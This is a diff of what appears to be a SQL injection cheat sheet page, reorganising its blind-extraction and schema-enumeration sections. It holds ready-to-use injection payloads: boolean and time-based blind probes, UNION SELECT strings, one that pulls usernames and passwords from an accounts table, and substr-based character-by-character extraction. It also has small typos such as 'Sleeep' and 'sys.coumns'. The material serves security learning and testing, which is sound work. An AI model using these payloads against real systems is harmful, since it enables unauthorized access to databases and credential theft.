@@ -125,8 +125,6 @@ Concatenation | <code> De''nt <br> De'||'nt </code>
 Binary/Boolean | <code> Dent' and 1;# <br> Dent' and 1=1;# <br> Dent' and 0;# <br> Dent' and 1=0;# </code>
 Sleep | <code> Sleeep(10) MySQL <br>  WAITFOR DELAY '0:0:10'  MSSQL
 
-> **Blind SQL Injection Data Exfiltration**
-
 Determine the level of blindness:
 {% highlight sql %}
 Dent' AND 1;#
@@ -135,13 +133,6 @@ Dent' AND 1=1;#
 Dent' AND 0;#
 Dent' AND 1=0;#
 #Look for differences
-{% endhighlight %}
-
-Perform a binary search tree: 
-{% highlight sql %}
-substr((select table_name from information_schema.tables limit 1),1,1) > "m"
-…
-= "c"
 {% endhighlight %}
 
 > **SQL Injection: Database Identification**
@@ -160,11 +151,20 @@ PostgreSQL | 5-digit Hex Error Code
 
 > **SQL Injection: Database, Table, and Columns
 
-**Database Type** | **Database** | **Table** | **Columns**
-------------- | ------------- | ------------- | ------------- | -------------
-MySQL |	schema_name FROM information_schema.schemata | table_name FROM information_schema.tables | column_name From information_schema.columns
-SQL Server | name FROM sys.databases | name FROM sys.tables | name FROM sys.coumns
-Oracle DB | owner FROM all_tables | table_name FROM all_tables | column_name FROM all_tab_columns
+MySQL:
+Database | schema_name FROM information_schema.schemata 
+Table | table_name FROM information_schema.tables
+Columns | column_name From information_schema.columns
+
+SQL Server:
+Database | name FROM sys.databases 
+Table | name FROM sys.tables 
+Columns | name FROM sys.coumns
+
+Oracle DB:
+Database | owner FROM all_tables 
+Table | table_name FROM all_tables 
+Columns | column_name FROM all_tab_columns
 
 > **SQL Injection Union**
 
@@ -185,6 +185,20 @@ or use NULL since it is compatable with everything
 Dent' UNION SELECT NULL, NULL, NULL;--
 <b>
 jeremy'+union+select+concat('The+password+for+',username,'+is+',+password),mysignature+from+accounts;+--+
+{% endhighlight %}
+
+> **Blind SQL Injection Data Exfiltration**
+
+Perform a binary search tree using substr: 
+
+{% highlight sql %}
+#Use
+substr(([Query]),[Letter],[Word]) > "m"
+
+substr((select table_name from information_schema.tables limit 1),1,1) > "m"
+…
+= "c"
+
 {% endhighlight %}
 
 > **Stacked Queries**
